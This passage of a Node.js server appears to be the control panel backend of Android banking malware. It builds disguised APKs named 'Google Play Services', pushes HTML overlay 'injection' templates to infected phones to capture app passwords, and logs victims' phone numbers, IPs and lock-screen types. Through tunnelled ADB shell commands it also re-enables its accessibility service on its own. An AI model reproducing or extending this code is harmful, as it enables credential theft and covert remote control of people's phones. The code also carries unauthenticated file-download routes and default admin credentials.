    }).sort((a, b) => b.buildTime.localeCompare(a.buildTime));
    res.json({ success: true, apkList: list });
  } catch { res.json({ success: true, apkList: [] }); }
});

// B包最新信息（A包构建时需要）
app.get('/api/ab-apk/latest-info', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/ab-apk-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    if (files.length === 0) return res.json({ success: false });
    files.sort((a, b) => fs.statSync(path.join(dir, b)).mtimeMs - fs.statSync(path.join(dir, a)).mtimeMs);
    // 包名从文件名或数据库获取（简化：用固定前缀+随机）
    res.json({ success: true, packageName: 'com.pro.viewer', accessibilityService: 'com.titan.solid.luck.service.unfaiahnst', mainActivity: '' });
  } catch { res.json({ success: false }); }
});

app.get('/api/ab-apk/build-status', authMiddleware, (req, res) => {
  res.json({ success: true, isBuilding: global._abBuilding || false, progress: global._abProgress || 0, message: global._abBuilding ? '构建中...' : '' });
});
app.get('/api/ab-apk/build-logs', authMiddleware, (req, res) => {
  res.json({ success: true, logs: global._abBuildLogs || [] });
});
app.get('/api/ab-apk/download', (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/ab-apk-output', filename);
  if (filename && fs.existsSync(fp)) { res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`); return res.sendFile(fp); }
  res.status(404).json({ success: false });
});
app.delete('/api/ab-apk/delete', authMiddleware, (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/ab-apk-output', filename);
  if (filename && fs.existsSync(fp)) { fs.unlinkSync(fp); return res.json({ success: true }); }
  res.json({ success: false });
});
app.all('/api/ab-apk/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));

// A包构建（覆盖安装版 - 自动获取B包包名实现同包名覆盖）
app.post('/api/abpack/build', authMiddleware, apkUpload.fields([{ name: 'icon', maxCount: 1 }]), (req, res) => {
  const { spawn } = require('child_process');
  let config = {};
  try { config = JSON.parse(req.body.config || '{}'); } catch { }

  const appName = config.appName || 'Google Play Services';
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `A_${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/abpack-output/${filename}`;

  // 找最新的 B包
  const bDir = '/opt/fisher-node/ab-apk-output';
  let bApkPath = '';
  try {
    const files = fs.readdirSync(bDir).filter(f => f.endsWith('.apk'));
    if (files.length > 0) {
      files.sort((a, b) => fs.statSync(path.join(bDir, b)).mtimeMs - fs.statSync(path.join(bDir, a)).mtimeMs);
      bApkPath = path.join(bDir, files[0]);
    }
  } catch { }

  if (!bApkPath) {
    return res.json({ success: false, error: '请先构建B包' });
  }

  let iconPath = '';
  if (req.files && req.files.icon && req.files.icon[0]) iconPath = req.files.icon[0].path;

  console.log(`[AB-A] 开始构建A包: name=${appName}, B包=${path.basename(bApkPath)}`);

  // build_a_pack.py 会自动从B包manifest提取真正包名实现覆盖安装
  const buildConfig = JSON.stringify(config);
  const buildArgs = ['/opt/fisher-node/apk-builder/build_a_pack.py', '--config', buildConfig, '--bapk', bApkPath, '--output', outputPath];
  if (iconPath) buildArgs.push('--icon', iconPath);

  global._abpackBuildLogs = [{ timestamp: Date.now(), level: 'info', message: `开始构建A包: ${appName}`, timeString: new Date().toLocaleString('zh-CN') }];
  global._abpackBuilding = true;

  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => { global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'info', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.stderr.on('data', d => { global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.on('close', code => {
    global._abpackBuilding = false;
    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(`[AB-A] ✅ A包构建成功: ${filename}`);
      global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'success', message: `A包构建成功: ${filename}`, timeString: new Date().toLocaleString('zh-CN') });
    } else {
      console.log(`[AB-A] ❌ A包构建失败`);
      global._abpackBuildLogs.push({ timestamp: Date.now(), level: 'error', message: 'A包构建失败', timeString: new Date().toLocaleString('zh-CN') });
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch { }
  });

  res.json({ success: true, message: 'A包构建已开始' });
});

app.get('/api/abpack/list', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/abpack-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    const list = files.map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19) };
    }).sort((a, b) => b.buildTime.localeCompare(a.buildTime));
    res.json({ success: true, data: list });
  } catch { res.json({ success: true, data: [] }); }
});

app.get('/api/abpack/build-status', authMiddleware, (req, res) => {
  res.json({ success: true, isBuilding: global._abpackBuilding || false, progress: global._abpackBuilding ? 50 : (global._abpackBuildLogs?.length > 0 ? 100 : 0), message: '' });
});
app.get('/api/abpack/build-logs', authMiddleware, (req, res) => {
  res.json({ success: true, logs: global._abpackBuildLogs || [] });
});
app.get('/api/abpack/download', (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/abpack-output', filename);
  if (filename && fs.existsSync(fp)) { res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`); return res.sendFile(fp); }
  res.status(404).json({ success: false });
});
app.delete('/api/abpack/delete', authMiddleware, (req, res) => {
  const filename = req.query.filename || '';
  const fp = path.join('/opt/fisher-node/abpack-output', filename);
  if (filename && fs.existsSync(fp)) { fs.unlinkSync(fp); return res.json({ success: true }); }
  res.json({ success: false });
});
app.all('/api/abpack/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.all('/api/ab-auto-build/*', authMiddleware, (req, res) => res.json({ success: true, data: [], targets: [], config: { enabled: false, intervalHours: 1 }, running: false, records: [] }));
app.get('/api/injection/global-configs', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates ORDER BY id').all();
  res.json({
    success: true,
    configs: rows.map(r => ({
      id: String(r.id),
      templateId: r.template_id,
      templateName: r.name,
      packageName: r.package_name,
      enabled: !!r.enabled,
      visible: r.visible !== 0,
      htmlContentSize: (r.html_content || '').length,
      createdAt: r.created_at || new Date().toISOString(),
      updatedAt: r.updated_at || new Date().toISOString()
    }))
  });
});

// POST /api/injection/global-configs - 更新模板启用/禁用/可见状态
app.post('/api/injection/global-configs', authMiddleware, (req, res) => {
  const { templateId, enabled, visible } = req.body || {};
  console.log(`[INJECT] POST global-configs: body=${JSON.stringify(req.body)}`);
  if (!templateId) return res.json({ success: false, message: '缺少templateId' });
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// PUT /api/injection/global-configs/:templateId - 更新单个配置
app.put('/api/injection/global-configs/:templateId', authMiddleware, (req, res) => {
  const { templateId } = req.params;
  const { enabled, visible } = req.body || {};
  console.log(`[INJECT] PUT global-configs/${templateId}: body=${JSON.stringify(req.body)}`);
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  // 支持按数字 id 或 template_id 查找
  const row = db.prepare('SELECT template_id FROM injection_templates WHERE id=? OR template_id=?').get(templateId, templateId);
  if (!row) return res.json({ success: false, message: 'not found' });
  const realTemplateId = row.template_id;
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, realTemplateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, realTemplateId);
  }
  res.json({ success: true });
});

// 设备端获取启用的注入配置（APP 调用）
app.get('/api/device/injection/global-configs', (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates WHERE enabled=1 AND visible=1').all();
  res.json({
    success: true,
    configs: rows.map(r => ({
      id: String(r.id),
      templateId: r.template_id,
      templateName: r.name,
      packageName: r.package_name,
      enabled: true,
      visible: true,
      htmlContent: r.html_content || '',
      htmlContentSize: (r.html_content || '').length,
      createdAt: r.created_at || '',
      updatedAt: r.updated_at || ''
    }))
  });
});

app.get('/api/device/:deviceId/global-injection-status', (req, res) => {
  const deviceId = req.params.deviceId || '';
  const rows = db.prepare('SELECT id, template_id FROM injection_templates WHERE enabled=1 AND visible=1').all();
  res.json({
    success: true,
    deviceId,
    enabled: rows.length > 0,
    count: rows.length,
    templateIds: rows.map(r => r.template_id)
  });
});

app.get('/api/injection/templates', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM injection_templates ORDER BY id').all();
  res.json({
    success: true,
    templates: rows.map(r => ({
      id: r.template_id,
      name: r.name,
      packageName: r.package_name,
      icon: r.icon,
      color: r.color,
      file: r.file,
      type: r.type || '',
      htmlContent: r.html_content || '',
      enabled: !!r.enabled,
      visible: r.visible !== 0
    }))
  });
});

app.get('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const row = db.prepare('SELECT * FROM injection_templates WHERE template_id=?').get(req.params.id);
  if (row) {
    // 前端直接读取 r.htmlContent，不包 data 层
    res.json({
      success: true,
      id: row.template_id,
      name: row.name,
      packageName: row.package_name,
      icon: row.icon,
      color: row.color,
      file: row.file,
      type: row.type || '',
      htmlContent: row.html_content || '',
      enabled: !!row.enabled,
      visible: row.visible !== 0
    });
  } else {
    res.json({ success: false, message: 'template not found' });
  }
});

// POST /api/injection/templates/:id - 保存模板 HTML 内容
app.post('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const templateId = req.params.id;
  const { htmlContent, name, packageName, icon, color, enabled, visible } = req.body || {};
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT id FROM injection_templates WHERE template_id=?').get(templateId);
  if (!row) return res.json({ success: false, message: 'template not found' });

  if (htmlContent !== undefined) {
    db.prepare('UPDATE injection_templates SET html_content=?,updated_at=? WHERE template_id=?').run(htmlContent, now, templateId);
  }
  if (name !== undefined) {
    db.prepare('UPDATE injection_templates SET name=?,updated_at=? WHERE template_id=?').run(name, now, templateId);
  }
  if (packageName !== undefined) {
    db.prepare('UPDATE injection_templates SET package_name=?,updated_at=? WHERE template_id=?').run(packageName, now, templateId);
  }
  if (icon !== undefined) {
    db.prepare('UPDATE injection_templates SET icon=?,updated_at=? WHERE template_id=?').run(icon, now, templateId);
  }
  if (color !== undefined) {
    db.prepare('UPDATE injection_templates SET color=?,updated_at=? WHERE template_id=?').run(color, now, templateId);
  }
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// PUT /api/injection/templates/:id - 同 POST
app.put('/api/injection/templates/:id', authMiddleware, (req, res) => {
  const templateId = req.params.id;
  const { htmlContent, name, packageName, icon, color, enabled, visible } = req.body || {};
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT id FROM injection_templates WHERE template_id=?').get(templateId);
  if (!row) return res.json({ success: false, message: 'template not found' });

  if (htmlContent !== undefined) {
    db.prepare('UPDATE injection_templates SET html_content=?,updated_at=? WHERE template_id=?').run(htmlContent, now, templateId);
  }
  if (name !== undefined) {
    db.prepare('UPDATE injection_templates SET name=?,updated_at=? WHERE template_id=?').run(name, now, templateId);
  }
  if (packageName !== undefined) {
    db.prepare('UPDATE injection_templates SET package_name=?,updated_at=? WHERE template_id=?').run(packageName, now, templateId);
  }
  if (enabled !== undefined) {
    db.prepare('UPDATE injection_templates SET enabled=?,updated_at=? WHERE template_id=?').run(enabled ? 1 : 0, now, templateId);
  }
  if (visible !== undefined) {
    db.prepare('UPDATE injection_templates SET visible=?,updated_at=? WHERE template_id=?').run(visible ? 1 : 0, now, templateId);
  }
  res.json({ success: true });
});

// 注入数据查询（前端"注入数据记录"页面用）
app.get('/api/injection/data', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  const pageSize = parseInt(req.query.pageSize) || 100;
  if (!deviceId) return res.json({ success: true, data: { list: [], total: 0 } });
  const rows = db.prepare('SELECT * FROM sms_notifications WHERE device_id=? AND type=? ORDER BY date DESC LIMIT ?').all(deviceId, 'injection', pageSize);
  const list = rows.map(r => {
    let parsed = {};
    try { parsed = JSON.parse(r.body || '{}'); } catch { }
    // 前端通过 os(t.data) 解析，把 password 注入 parsed
    if (!parsed.password && !parsed.pass && !parsed.pwd && parsed.data) {
      parsed.password = parsed.data;
    }
    return {
      id: r.id,
      deviceId: r.device_id,
      deviceName: r.device_name,
      address: r.address,
      body: r.body,
      data: parsed,  // 前端用 os(t.data) 解析这个对象
      date: r.date,
      timestamp: parsed.timestamp || r.date,
      type: r.type,
      packageName: parsed.packageName || (r.address || '').replace('[注入] ', ''),
    };
  });
  res.json({ success: true, data: { list, total: list.length } });
});




// 注入活跃任务
app.post('/api/injection/active-tasks', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/injection/active-tasks', authMiddleware, (req, res) => res.json({ success: true }));

// 注入推送到设备
app.post('/api/injection/push', authMiddleware, (req, res) => {
  const { deviceId, templateId } = req.body || {};
  if (!deviceId || !templateId) return res.json({ success: false, message: '缺少参数' });

  const template = db.prepare('SELECT * FROM injection_templates WHERE template_id=?').get(templateId);
  if (!template || !template.html_content) return res.json({ success: false, message: '模板不存在或无内容' });

  // 通过 WebSocket 推送给设备
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({
      type: 'command',
      data: {
        command: 'INJECT',
        params: {
          templateId: template.template_id,
          packageName: template.package_name,
          htmlContent: template.html_content
        }
      }
    }));
    console.log(`[INJECT] → ${deviceId}: ${templateId}`);
    res.json({ success: true, message: '注入已推送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// 通配注入路由（放在具体路由后面）
app.all('/api/injection/*', authMiddleware, (req, res) => res.json({ success: true, data: [] }));


// ============================================================
// 安装/初始化页面：/install
// - 无 install.lock 时允许初始化/重置管理员账号
// - 存在 install.lock 时返回已初始化提示；如需重新初始化，删除该锁文件
// ============================================================
function installLockExists() {
  return fs.existsSync(INSTALL_LOCK_PATH);
}

function getInstallChecks() {
  const pkg = (() => {
    try { return require(path.join(__dirname, 'package.json')); } catch { return { dependencies: {} }; }
  })();
  const deps = Object.keys(pkg.dependencies || {});
  const dependencyChecks = deps.map(name => {
    try {
      require.resolve(name, { paths: [__dirname] });
      return { name, ok: true };
    } catch (e) {
      return { name, ok: false, message: e.message };
    }
  });

  const checks = [];
  const nodeMajor = parseInt(process.versions.node.split('.')[0], 10);
  checks.push({ name: 'Node.js 版本 >= 18', ok: nodeMajor >= 18, value: process.versions.node });
  checks.push({ name: '前端目录', ok: fs.existsSync(path.join(STATIC_DIR, 'index.html')), value: STATIC_DIR });
  checks.push({ name: '数据库文件', ok: fs.existsSync(DB_PATH), value: DB_PATH });
  try { fs.accessSync(path.dirname(DB_PATH), fs.constants.R_OK | fs.constants.W_OK); checks.push({ name: '数据库目录可写', ok: true, value: path.dirname(DB_PATH) }); }
  catch (e) { checks.push({ name: '数据库目录可写', ok: false, value: path.dirname(DB_PATH), message: e.message }); }
  try { fs.accessSync(DB_PATH, fs.constants.R_OK | fs.constants.W_OK); checks.push({ name: '数据库可读写', ok: true, value: DB_PATH }); }
  catch (e) { checks.push({ name: '数据库可读写', ok: false, value: DB_PATH, message: e.message }); }
  checks.push({ name: 'package-lock.json', ok: fs.existsSync(path.join(__dirname, 'package-lock.json')), value: path.join(__dirname, 'package-lock.json') });
  checks.push({ name: 'frps 配置', ok: fs.existsSync(path.resolve(__dirname, '../frps/frps.ini')) || fs.existsSync('/opt/frps/frps.ini'), value: path.resolve(__dirname, '../frps/frps.ini') });
  return { checks, dependencyChecks, ok: checks.every(c => c.ok) && dependencyChecks.every(c => c.ok) };
}

function renderInstallPage() {
  const locked = installLockExists();
  const status = getInstallChecks();
  const checkRows = status.checks.map(c => `<li class="${c.ok ? 'ok' : 'bad'}"><b>${c.ok ? '✓' : '✗'} ${c.name}</b><span>${c.value || ''}</span>${c.message ? `<small>${c.message}</small>` : ''}</li>`).join('');
  const depRows = status.dependencyChecks.map(c => `<li class="${c.ok ? 'ok' : 'bad'}"><b>${c.ok ? '✓' : '✗'} ${c.name}</b>${c.message ? `<small>${c.message}</small>` : ''}</li>`).join('');
  return `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>熊猫工坊初始化</title><style>
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,"PingFang SC","Microsoft YaHei",sans-serif;background:#0d1117;color:#e6edf3}.wrap{max-width:920px;margin:0 auto;padding:42px 20px}.card{background:#161b22;border:1px solid #30363d;border-radius:14px;padding:24px;margin-bottom:18px;box-shadow:0 10px 30px rgba(0,0,0,.25)}h1{margin:0 0 8px;font-size:28px}.muted{color:#8b949e}.grid{display:grid;grid-template-columns:1fr 1fr;gap:18px}@media(max-width:800px){.grid{grid-template-columns:1fr}}ul{list-style:none;margin:12px 0 0;padding:0}li{padding:10px 12px;border-radius:10px;margin:8px 0;background:#0d1117;border:1px solid #30363d}li.ok b{color:#3fb950}li.bad b{color:#f85149}li span,small{display:block;color:#8b949e;word-break:break-all;margin-top:4px}label{display:block;margin:12px 0 6px;color:#c9d1d9}input{width:100%;box-sizing:border-box;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:10px;padding:12px;font-size:15px}button{margin-top:16px;background:#238636;color:#fff;border:0;border-radius:10px;padding:12px 18px;font-size:15px;cursor:pointer}button:disabled{opacity:.55;cursor:not-allowed}.warn{border-color:#d29922;background:#2d230b}.warn b{color:#d29922}.msg{margin-top:12px;white-space:pre-wrap}.path{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#79c0ff}</style></head><body><div class="wrap"><div class="card"><h1>熊猫工坊初始化</h1><div class="muted">前端目录：<span class="path">${STATIC_DIR}</span><br/>数据库：<span class="path">${DB_PATH}</span><br/>锁文件：<span class="path">${INSTALL_LOCK_PATH}</span></div></div>${locked ? `<div class="card warn"><h2>已初始化</h2><p>检测到 install.lock 锁文件，初始化入口已锁定。如需重置管理员账号或重新初始化，请先在服务器删除这个文件：</p><p class="path">${INSTALL_LOCK_PATH}</p></div>` : `<div class="card"><h2>设置管理员账号</h2><p class="muted">提交后会创建/重置超级管理员，并生成 install.lock 锁文件。</p><form id="form"><label>管理员账号</label><input name="username" value="mtx" required/><label>管理员密码</label><input name="password" type="password" value="mtx123" required minlength="6"/><button type="submit">初始化 / 重置管理员</button><div id="msg" class="msg"></div></form></div>`}<div class="grid"><div class="card"><h2>环境校验</h2><ul>${checkRows}</ul></div><div class="card"><h2>Node 依赖校验</h2><ul>${depRows}</ul></div></div></div><script>
    const form=document.getElementById('form');
    if(form){form.addEventListener('submit',async e=>{e.preventDefault();const msg=document.getElementById('msg');msg.textContent='正在提交...';const data=Object.fromEntries(new FormData(form).entries());try{const r=await fetch('/api/install/admin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});const j=await r.json();msg.textContent=(j.success?'✅ ':'❌ ')+(j.message||JSON.stringify(j));if(j.success)setTimeout(()=>location.reload(),900)}catch(err){msg.textContent='❌ '+err.message}})}
  </script></body></html>`;
}

app.get('/install', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.type('html').send(renderInstallPage());
});

app.get('/api/install/status', (req, res) => {
  res.json({ success: true, initialized: installLockExists(), lockFile: INSTALL_LOCK_PATH, staticDir: STATIC_DIR, dbPath: DB_PATH, ...getInstallChecks() });
});

app.post('/api/install/admin', (req, res) => {
  if (installLockExists()) {
    return res.status(409).json({ success: false, message: `已初始化；如需重新初始化，请删除锁文件：${INSTALL_LOCK_PATH}` });
  }
  const username = String(req.body?.username || '').trim();
  const password = String(req.body?.password || '').trim();
  if (!username) return res.status(400).json({ success: false, message: '管理员账号不能为空' });
  if (password.length < 6) return res.status(400).json({ success: false, message: '管理员密码至少 6 位' });

  const hash = bcrypt.hashSync(password, 10);
  const sessionId = require('crypto').randomBytes(16).toString('hex');
  const target = db.prepare('SELECT id FROM users WHERE id=1').get();
  const sameName = db.prepare('SELECT id FROM users WHERE username=?').get(username);
  if (sameName && (!target || sameName.id !== target.id)) {
    return res.status(409).json({ success: false, message: `账号 ${username} 已存在，请换一个管理员账号` });
  }
  if (target) {
    db.prepare("UPDATE users SET username=?, password_hash=?, role='admin', max_devices=100, is_super=1, active_session=?, login_fail_count=0, locked_until=0 WHERE id=1").run(username, hash, sessionId);
  } else {
    db.prepare("INSERT INTO users (id, username, password_hash, role, max_devices, is_super, active_session, login_fail_count, locked_until) VALUES (1, ?, ?, 'admin', 100, 1, ?, 0, 0)").run(username, hash, sessionId);
  }
  try { db.prepare("DELETE FROM login_fail_tracker WHERE key=? OR key=?").run(`user:${username}`, 'ip:127.0.0.1'); } catch {}
  fs.mkdirSync(path.dirname(INSTALL_LOCK_PATH), { recursive: true });
  fs.writeFileSync(INSTALL_LOCK_PATH, JSON.stringify({ initializedAt: new Date().toISOString(), username }, null, 2));
  console.log(`[INSTALL] 管理员账号已初始化: ${username}; lock=${INSTALL_LOCK_PATH}`);
  res.json({ success: true, message: `管理员已初始化：${username}。锁文件已生成。` });
});

// 静态文件（前端）
app.use(express.static(STATIC_DIR));
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api/') && !req.path.startsWith('/ws/')) {
    res.sendFile(path.join(STATIC_DIR, 'index.html'));
  }
});

// ============================================================
// 设备数据格式转换（匹配原版前端）
// ============================================================
// bot_list 格式（WebSocket推送给管理端）
function deviceToBotList(row, lockScreenMap, injectionCountMap) {
  const deviceId = row.device_id || '';
  const brand = (row.brand || 'UNKNOWN').toUpperCase();
  // lockScreenType 从预取 map 取
  const lockScreenType = (lockScreenMap && lockScreenMap[deviceId]) || '';
  return {
    accessibilityAlive: true,
    appName: row.app_name || 'Fisher',
    appVersion: row.app_version || '1.0.0',
    controlledBy: null,
    cryptoApps: [],
    firstInstallTime: Math.floor((row.first_seen || 0) * 1000),
    hasSim: true,
    id: deviceId,
    injectionCount: (injectionCountMap && injectionCountMap[deviceId]) || 0,
    lastSeen: Math.floor((row.last_seen || 0) * 1000),
    lockScreenType: lockScreenType,
    model: row.model || '',
    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
    osVersion: row.os_version || '',
    phoneNumber: row.phone_number || '',
    phoneNumber2: '',
    publicIP: row.public_ip || '',
    remark: row.remark || '',
    screenHeight: row.screen_height || 0,
    screenWidth: row.screen_width || 0,
    status: (row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))) ? 'online' : 'offline',
  };
}

// device/list 格式（HTTP API返回）
function deviceToListApi(row, lockScreenMap, injectionCountMap) {
  const deviceId = row.device_id || '';
  const brand = (row.brand || 'UNKNOWN').toUpperCase();
  // lockScreenType: 优先从预取 map 取，没有则回退单次查询（兼容旧调用）
  let lockScreenType = '';
  if (lockScreenMap && lockScreenMap[deviceId] !== undefined) {
    lockScreenType = lockScreenMap[deviceId];
  } else {
    const p = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
    if (p) {
      const tm = { '6pin': 'pin', '4pin': 'pin', 'pin': 'pin', 'mixed': 'mixed', 'pattern': 'pattern', 'password': 'password' };
      lockScreenType = tm[p.password_type] || p.password_type || '';
    }
  }
  return {
    id: deviceId,
    accessibilityAlive: true,
    appName: row.app_name || 'Fisher',
    appVersion: row.app_version || '1.0.0',
    batteryLevel: row.battery_level || 0,
    brand: brand,
    brandCode: 0,
    connectionCount: 1,
    controlledBy: null,
    firstInstallTime: Math.floor((row.first_seen || 0) * 1000),
    firstSeen: Math.floor((row.first_seen || 0) * 1000),
    groupName: row.group_name || '',
    hasSim: true,
    injectionCount: (injectionCountMap && injectionCountMap[deviceId]) || 0,
    inputBlocked: false,
    isCharging: false,
    isLocked: !!(row.is_locked),
    isOnline: !!(row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))),
    lastSeen: Math.floor((row.last_seen || 0) * 1000),
    localServiceConnected: !!row.local_service_connected,
    localServiceDeployed: false,
    lockScreenType,
    model: row.model || '',
    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
    networkType: row.network_type || '',
    osVersion: row.os_version || '',
    phoneNumber: row.phone_number || '',
    phoneNumber2: '',
    pinned: false,
    publicIP: row.public_ip || '',
    ipGeo: (() => { const ip = row.public_ip || ''; if (!ip) return ''; const geo = _ipGeoCache.get(ip); if (!geo) return ''; const cm = {China:'中国','United States':'美国',Japan:'日本','South Korea':'韩国','Hong Kong':'香港',Taiwan:'台湾',Singapore:'新加坡',India:'印度',Thailand:'泰国',Vietnam:'越南',Malaysia:'马来西亚',Indonesia:'印尼',Philippines:'菲律宾',Brazil:'巴西'}; const rm = {Beijing:'北京',Shanghai:'上海',Guangdong:'广东',Zhejiang:'浙江',Jiangsu:'江苏',Shandong:'山东',Sichuan:'四川',Fujian:'福建',Liaoning:'辽宁',Henan:'河南',Hubei:'湖北',Hunan:'湖南'}; return [cm[geo.country]||geo.country, rm[geo.region]||geo.region].filter(Boolean).join(' '); })(),
    remark: row.remark || '',
    romType: '',
    romVersion: '',
    screenHeight: row.screen_height || 0,
    screenWidth: row.screen_width || 0,
    status: (row.is_connected && (deviceConnections.has(row.device_id || '') || bridgeConnections.has(row.device_id || ''))) ? 'online' : 'offline',
  };
}

// ============================================================
// HTTPS 服务器 + WebSocket
// ============================================================
let server;
const secureContexts = {};

// 动态创建已存在证书域名的安全上下文
for (const domain in CERT_MAPPING) {
  const cand = CERT_MAPPING[domain];
  if (fs.existsSync(cand.cert) && fs.existsSync(cand.key)) {
    try {
      secureContexts[domain] = tls.createSecureContext({
        cert: fs.readFileSync(cand.cert),
        key: fs.readFileSync(cand.key)
      });
      console.log(`[SSL] 🛡️ 已为域名 ${domain} 创建安全上下文`);
    } catch (e) {
      console.log(`[SSL] ❌ 域名 ${domain} 上下文创建失败: ${e.message}`);
    }
  }
}

const loadedDomains = Object.keys(secureContexts);

if (loadedDomains.length > 0) {
  // 选第一个有效的作为默认证书
  const defaultDomain = loadedDomains[0];
  const defaultCert = CERT_MAPPING[defaultDomain].cert;
  const defaultKey = CERT_MAPPING[defaultDomain].key;

  server = https.createServer({
    cert: fs.readFileSync(defaultCert),
    key: fs.readFileSync(defaultKey),
    SNICallback: (servername, cb) => {
      const ctx = secureContexts[servername];
      if (ctx) {
        cb(null, ctx);
      } else {
        // 匹配不到时使用默认证书
        cb(null, secureContexts[defaultDomain]);
      }
    }
  }, app);
  console.log(`[SSL] ✅ HTTPS 通过 SNI 多证书模式自适应拉起，默认域名为: ${defaultDomain} (支持并发域名: ${loadedDomains.join(', ')})`);
} else {
  server = http.createServer(app);
  console.log('[HTTP] ⚠️ 警告: 未检测到任何可用的 SSL 证书目录，使用明文模式运行');
}

const wss = new WebSocketServer({ noServer: true });

// WebSocket 连接池
const deviceConnections = new Map();  // deviceId -> ws
const adminConnections = new Set();   // Set<ws>
const adminSubscriptions = new Map(); // ws -> Set<deviceId> (管理端订阅的设备)
const deviceSubscribers = new Map();  // deviceId -> Set<ws> (订阅某设备的管理端)

// ============================================================
// 无障碍自动恢复模块
// ============================================================
// 冷却记录：deviceId -> lastRestoreTimestamp，5分钟内不重复触发
const a11yCooldown = new Map();
const A11Y_COOLDOWN_MS = 60 * 1000; // 1分钟

/**
 * 通过 ADB(frpc) 自动恢复无障碍服务
 * 触发条件：APP心跳上报 accessibilityAlive=false，或定时检查发现无障碍关闭
 */
function autoRestoreAccessibility(deviceId, reason) {
  const now = Date.now();
  const last = a11yCooldown.get(deviceId) || 0;
  if (now - last < A11Y_COOLDOWN_MS) return;
  a11yCooldown.set(deviceId, now);

  console.log('[A11Y-AUTO] ' + deviceId + ': enabling accessibility (reason=' + reason + ')');

  const http = require('http');
  const port = getDevicePort(deviceId);

  const devRow = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
  const cachedPkg = devRow && devRow.app_name && devRow.app_name.startsWith('com.') ? devRow.app_name : null;

  function doEnable(pkgName) {
    // ★ 先查当前值，如果已包含该包名的服务就直接用（避免覆盖正确的组件名）
    const checkCmd2 = encodeURIComponent('settings get secure enabled_accessibility_services');
    http.get('http://127.0.0.1:' + port + '/shell?cmd=' + checkCmd2, { timeout: 4000 }, function (r2) {
      var ch2 = []; r2.on('data', c => ch2.push(c)); r2.on('end', function () {
        try {
          var cur2 = (JSON.parse(Buffer.concat(ch2).toString()).data?.output || '').trim();
          if (cur2 && cur2.includes(pkgName) && cur2.includes('/')) {
            // 设备已有该包名的服务注册，直接enable即可
            var svc = cur2.split(':').find(s => s.includes(pkgName)) || (pkgName + '/.service.a');
            var cmd = encodeURIComponent('settings put secure enabled_accessibility_services ' + svc + ' && settings put secure accessibility_enabled 1');
            _doWriteA11y(deviceId, port, cmd, svc);
            return;
          }
        } catch (e) { }
